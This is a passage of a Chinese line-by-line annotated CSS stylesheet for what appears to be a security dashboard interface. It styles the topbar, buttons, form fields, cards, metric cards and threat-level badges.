| 134 | 样式属性：设置 `flex` 的视觉或布局效果。 | `  flex: 1;` |
| 135 | 样式属性：设置 `min-width` 的视觉或布局效果。 | `  min-width: 0;` |
| 136 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 137 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 138 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 139 | 空行：分隔样式规则。 | `&nbsp;` |
| 140 | 选择器：指定接下来要设置样式的页面元素。 | `.topbar {` |
| 141 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 142 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 143 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: space-between;` |
| 144 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md) var(--space-xl);` |
| 145 | 样式属性：设置 `border-bottom` 的视觉或布局效果。 | `  border-bottom: 1px solid var(--border-subtle);` |
| 146 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--bg-void);` |
| 147 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 148 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: sticky;` |
| 149 | 样式属性：设置 `top` 的视觉或布局效果。 | `  top: 0;` |
| 150 | 样式属性：设置 `z-index` 的视觉或布局效果。 | `  z-index: 20;` |
| 151 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 152 | 空行：分隔样式规则。 | `&nbsp;` |
| 153 | 选择器：指定接下来要设置样式的页面元素。 | `.topbar__left {` |
| 154 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 155 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 156 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 157 | 样式属性：设置 `min-width` 的视觉或布局效果。 | `  min-width: 0;` |
| 158 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 159 | 空行：分隔样式规则。 | `&nbsp;` |
| 160 | 选择器：指定接下来要设置样式的页面元素。 | `.topbar__title {` |
| 161 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h2);` |
| 162 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 600;` |
| 163 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 164 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 165 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 166 | 空行：分隔样式规则。 | `&nbsp;` |
| 167 | 选择器：指定接下来要设置样式的页面元素。 | `.topbar__actions {` |
| 168 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 169 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 170 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 171 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 172 | 空行：分隔样式规则。 | `&nbsp;` |
| 173 | 选择器：指定接下来要设置样式的页面元素。 | `.topbar__user {` |
| 174 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 175 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 176 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 177 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 178 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 179 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 180 | 空行：分隔样式规则。 | `&nbsp;` |
| 181 | 样式注释：说明这一段 CSS 的用途。 | `/* 汉堡按钮（<768 时启用） */` |
| 182 | 选择器：指定接下来要设置样式的页面元素。 | `.menu-toggle {` |
| 183 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: none;` |
| 184 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 40px;` |
| 185 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 40px;` |
| 186 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 187 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: center;` |
| 188 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: transparent;` |
| 189 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-default);` |
| 190 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-md);` |
| 191 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 192 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: pointer;` |
| 193 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 194 | 空行：分隔样式规则。 | `&nbsp;` |
| 195 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 196 | 样式注释：说明这一段 CSS 的用途。 | ` * 按钮` |
| 197 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 198 | 选择器：指定接下来要设置样式的页面元素。 | `.btn {` |
| 199 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: inline-flex;` |
| 200 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 201 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: center;` |
| 202 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-xs);` |
| 203 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 36px;` |
| 204 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 8px var(--space-md);` |
| 205 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-md);` |
| 206 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid transparent;` |
| 207 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: transparent;` |
| 208 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 209 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: inherit;` |
| 210 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 211 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 500;` |
| 212 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: pointer;` |
| 213 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: background 0.15s ease, border-color 0.15s ease,` |
| 214 | 样式语句：参与页面视觉布局。 | `    color 0.15s ease, transform 0.15s ease;` |
| 215 | 样式属性：设置 `white-space` 的视觉或布局效果。 | `  white-space: nowrap;` |
| 216 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 217 | 空行：分隔样式规则。 | `&nbsp;` |
| 218 | 选择器：指定接下来要设置样式的页面元素。 | `.btn:disabled {` |
| 219 | 样式属性：设置 `opacity` 的视觉或布局效果。 | `  opacity: 0.5;` |
| 220 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: not-allowed;` |
| 221 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 222 | 空行：分隔样式规则。 | `&nbsp;` |
| 223 | 选择器：指定接下来要设置样式的页面元素。 | `.btn--primary {` |
| 224 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald);` |
| 225 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--bg-void);` |
| 226 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 227 | 空行：分隔样式规则。 | `&nbsp;` |
| 228 | 选择器：指定接下来要设置样式的页面元素。 | `.btn--primary:hover:not(:disabled) {` |
| 229 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald-hover);` |
| 230 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 231 | 空行：分隔样式规则。 | `&nbsp;` |
| 232 | 选择器：指定接下来要设置样式的页面元素。 | `.btn--ghost {` |
| 233 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: var(--border-default);` |
| 234 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 235 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 236 | 空行：分隔样式规则。 | `&nbsp;` |
| 237 | 选择器：指定接下来要设置样式的页面元素。 | `.btn--ghost:hover:not(:disabled) {` |
| 238 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 239 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 240 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 241 | 空行：分隔样式规则。 | `&nbsp;` |
| 242 | 选择器：指定接下来要设置样式的页面元素。 | `.btn--danger {` |
| 243 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--error-red);` |
| 244 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #ffffff;` |
| 245 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 246 | 空行：分隔样式规则。 | `&nbsp;` |
| 247 | 选择器：指定接下来要设置样式的页面元素。 | `.btn--danger:hover:not(:disabled) {` |
| 248 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: #dc2626;` |
| 249 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 250 | 空行：分隔样式规则。 | `&nbsp;` |
| 251 | 选择器：指定接下来要设置样式的页面元素。 | `.btn--terminal {` |
| 252 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 253 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 254 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: transparent;` |
| 255 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-default);` |
| 256 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 257 | 空行：分隔样式规则。 | `&nbsp;` |
| 258 | 选择器：指定接下来要设置样式的页面元素。 | `.btn--terminal::before {` |
| 259 | 样式属性：设置 `content` 的视觉或布局效果。 | `  content: "▶";` |
| 260 | 样式属性：设置 `margin-right` 的视觉或布局效果。 | `  margin-right: var(--space-xs);` |
| 261 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 262 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 263 | 空行：分隔样式规则。 | `&nbsp;` |
| 264 | 选择器：指定接下来要设置样式的页面元素。 | `.btn--terminal:hover:not(:disabled) {` |
| 265 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald-glow);` |
| 266 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 267 | 空行：分隔样式规则。 | `&nbsp;` |
| 268 | 选择器：指定接下来要设置样式的页面元素。 | `.btn--block {` |
| 269 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 100%;` |
| 270 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 271 | 空行：分隔样式规则。 | `&nbsp;` |
| 272 | 选择器：指定接下来要设置样式的页面元素。 | `.btn--sm {` |
| 273 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 30px;` |
| 274 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 4px 10px;` |
| 275 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 276 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 277 | 空行：分隔样式规则。 | `&nbsp;` |
| 278 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 279 | 样式注释：说明这一段 CSS 的用途。 | ` * 表单控件` |
| 280 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 281 | 选择器：指定接下来要设置样式的页面元素。 | `.form-group {` |
| 282 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-md);` |
| 283 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 284 | 空行：分隔样式规则。 | `&nbsp;` |
| 285 | 选择器：指定接下来要设置样式的页面元素。 | `.form-label {` |
| 286 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: block;` |
| 287 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-xs);` |
| 288 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 289 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 290 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 291 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.05em;` |
| 292 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 293 | 空行：分隔样式规则。 | `&nbsp;` |
| 294 | 样式语句：参与页面视觉布局。 | `.form-input,` |
| 295 | 样式语句：参与页面视觉布局。 | `.form-select,` |
| 296 | 选择器：指定接下来要设置样式的页面元素。 | `.form-textarea {` |
| 297 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 100%;` |
| 298 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 38px;` |
| 299 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 8px 12px;` |
| 300 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 301 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 302 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-default);` |
| 303 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-md);` |
| 304 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: inherit;` |
| 305 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 306 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: border-color 0.15s ease, box-shadow 0.15s ease;` |
| 307 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 308 | 空行：分隔样式规则。 | `&nbsp;` |
| 309 | 样式属性：设置 `.form-input` 的视觉或布局效果。 | `.form-input:focus,` |
| 310 | 样式属性：设置 `.form-select` 的视觉或布局效果。 | `.form-select:focus,` |
| 311 | 选择器：指定接下来要设置样式的页面元素。 | `.form-textarea:focus {` |
| 312 | 样式属性：设置 `outline` 的视觉或布局效果。 | `  outline: none;` |
| 313 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: var(--accent-emerald);` |
| 314 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: 0 0 0 3px var(--accent-emerald-glow);` |
| 315 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 316 | 空行：分隔样式规则。 | `&nbsp;` |
| 317 | 样式属性：设置 `.form-input` 的视觉或布局效果。 | `.form-input::placeholder,` |
| 318 | 选择器：指定接下来要设置样式的页面元素。 | `.form-textarea::placeholder {` |
| 319 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 320 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 321 | 空行：分隔样式规则。 | `&nbsp;` |
| 322 | 选择器：指定接下来要设置样式的页面元素。 | `.form-input--mono {` |
| 323 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 324 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-mono);` |
| 325 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 326 | 空行：分隔样式规则。 | `&nbsp;` |
| 327 | 选择器：指定接下来要设置样式的页面元素。 | `.form-error {` |
| 328 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--error-red);` |
| 329 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 330 | 样式属性：设置 `margin-top` 的视觉或布局效果。 | `  margin-top: var(--space-xs);` |
| 331 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 18px;` |
| 332 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 333 | 空行：分隔样式规则。 | `&nbsp;` |
| 334 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 335 | 样式注释：说明这一段 CSS 的用途。 | ` * 卡片 / 面板` |
| 336 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 337 | 选择器：指定接下来要设置样式的页面元素。 | `.card {` |
| 338 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-dark);` |
| 339 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 340 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-lg);` |
| 341 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: var(--shadow-1);` |
| 342 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: border-color 0.15s ease, transform 0.15s ease;` |
| 343 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 344 | 空行：分隔样式规则。 | `&nbsp;` |
| 345 | 选择器：指定接下来要设置样式的页面元素。 | `.card:hover {` |
| 346 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: var(--border-default);` |
| 347 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 348 | 空行：分隔样式规则。 | `&nbsp;` |
| 349 | 选择器：指定接下来要设置样式的页面元素。 | `.card--padded {` |
| 350 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-lg);` |
| 351 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 352 | 空行：分隔样式规则。 | `&nbsp;` |
| 353 | 选择器：指定接下来要设置样式的页面元素。 | `.card__header {` |
| 354 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 355 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 356 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: space-between;` |
| 357 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md) var(--space-lg);` |
| 358 | 样式属性：设置 `border-bottom` 的视觉或布局效果。 | `  border-bottom: 1px solid var(--border-subtle);` |
| 359 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 360 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 361 | 空行：分隔样式规则。 | `&nbsp;` |
| 362 | 选择器：指定接下来要设置样式的页面元素。 | `.card__title {` |
| 363 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 364 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 365 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 366 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h3);` |
| 367 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 368 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 600;` |
| 369 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 370 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 371 | 空行：分隔样式规则。 | `&nbsp;` |
| 372 | 选择器：指定接下来要设置样式的页面元素。 | `.card__title::before {` |
| 373 | 样式属性：设置 `content` 的视觉或布局效果。 | `  content: "";` |
| 374 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 2px;` |
| 375 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 14px;` |
| 376 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald);` |
| 377 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 2px;` |
| 378 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 379 | 空行：分隔样式规则。 | `&nbsp;` |
| 380 | 选择器：指定接下来要设置样式的页面元素。 | `.card__body {` |
| 381 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-lg);` |
| 382 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 383 | 空行：分隔样式规则。 | `&nbsp;` |
| 384 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 385 | 样式注释：说明这一段 CSS 的用途。 | ` * 指标卡 (Metric Card)  — DESIGN.md §4.2` |
| 386 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 387 | 选择器：指定接下来要设置样式的页面元素。 | `.metrics-grid {` |
| 388 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 389 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 390 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: repeat(4, minmax(0, 1fr));` |
| 391 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-lg);` |
| 392 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 393 | 空行：分隔样式规则。 | `&nbsp;` |
| 394 | 选择器：指定接下来要设置样式的页面元素。 | `.metric-card {` |
| 395 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-dark);` |
| 396 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 397 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-lg);` |
| 398 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-lg);` |
| 399 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 400 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 401 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 402 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: transform 0.15s ease, border-color 0.15s ease,` |
| 403 | 样式语句：参与页面视觉布局。 | `    box-shadow 0.15s ease;` |
| 404 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 405 | 空行：分隔样式规则。 | `&nbsp;` |
| 406 | 选择器：指定接下来要设置样式的页面元素。 | `.metric-card:hover {` |
| 407 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: var(--border-default);` |
| 408 | 样式属性：设置 `transform` 的视觉或布局效果。 | `  transform: translateY(-1px);` |
| 409 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: var(--shadow-2);` |
| 410 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 411 | 空行：分隔样式规则。 | `&nbsp;` |
| 412 | 选择器：指定接下来要设置样式的页面元素。 | `.metric-card__label {` |
| 413 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 414 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 415 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 416 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.05em;` |
| 417 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 418 | 空行：分隔样式规则。 | `&nbsp;` |
| 419 | 选择器：指定接下来要设置样式的页面元素。 | `.metric-card__value {` |
| 420 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-display);` |
| 421 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 700;` |
| 422 | 样式属性：设置 `line-height` 的视觉或布局效果。 | `  line-height: 1.2;` |
| 423 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 424 | 样式属性：设置 `font-variant-numeric` 的视觉或布局效果。 | `  font-variant-numeric: tabular-nums;` |
| 425 | 样式属性：设置 `font-feature-settings` 的视觉或布局效果。 | `  font-feature-settings: "tnum";` |
| 426 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 427 | 空行：分隔样式规则。 | `&nbsp;` |
| 428 | 选择器：指定接下来要设置样式的页面元素。 | `.metric-card__value--emerald {` |
| 429 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 430 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 431 | 空行：分隔样式规则。 | `&nbsp;` |
| 432 | 选择器：指定接下来要设置样式的页面元素。 | `.metric-card__value--danger {` |
| 433 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-high);` |
| 434 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 435 | 空行：分隔样式规则。 | `&nbsp;` |
| 436 | 选择器：指定接下来要设置样式的页面元素。 | `.metric-card__value--warning {` |
| 437 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-medium);` |
| 438 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 439 | 空行：分隔样式规则。 | `&nbsp;` |
| 440 | 选择器：指定接下来要设置样式的页面元素。 | `.metric-card__trend {` |
| 441 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: inline-flex;` |
| 442 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 443 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-xs);` |
| 444 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 445 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 446 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 447 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 448 | 空行：分隔样式规则。 | `&nbsp;` |
| 449 | 选择器：指定接下来要设置样式的页面元素。 | `.metric-card__trend--up {` |
| 450 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 451 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 452 | 空行：分隔样式规则。 | `&nbsp;` |
| 453 | 选择器：指定接下来要设置样式的页面元素。 | `.metric-card__trend--down {` |
| 454 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-high);` |
| 455 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 456 | 空行：分隔样式规则。 | `&nbsp;` |
| 457 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 458 | 样式注释：说明这一段 CSS 的用途。 | ` * 威胁等级徽章 (Badge) — DESIGN.md §4.1` |
| 459 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 460 | 选择器：指定接下来要设置样式的页面元素。 | `.badge {` |
| 461 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: inline-flex;` |
| 462 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 463 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: 4px;` |
| 464 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 2px 8px;` |
| 465 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-sm);` |
| 466 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid transparent;` |
| 467 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 468 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 500;` |
| 469 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 470 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.05em;` |
| 471 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-sans);` |
| 472 | 样式属性：设置 `white-space` 的视觉或布局效果。 | `  white-space: nowrap;` |
| 473 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 474 | 空行：分隔样式规则。 | `&nbsp;` |
| 475 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--low {` |
| 476 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-low);` |
| 477 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(59, 130, 246, 0.15);` |
| 478 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(59, 130, 246, 0.3);` |
| 479 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 480 | 空行：分隔样式规则。 | `&nbsp;` |
| 481 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--medium {` |
| 482 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-medium);` |
| 483 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(245, 158, 11, 0.15);` |
| 484 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(245, 158, 11, 0.3);` |
| 485 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 486 | 空行：分隔样式规则。 | `&nbsp;` |
| 487 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--high {` |
| 488 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-high);` |
| 489 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(239, 68, 68, 0.15);` |
| 490 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(239, 68, 68, 0.3);` |
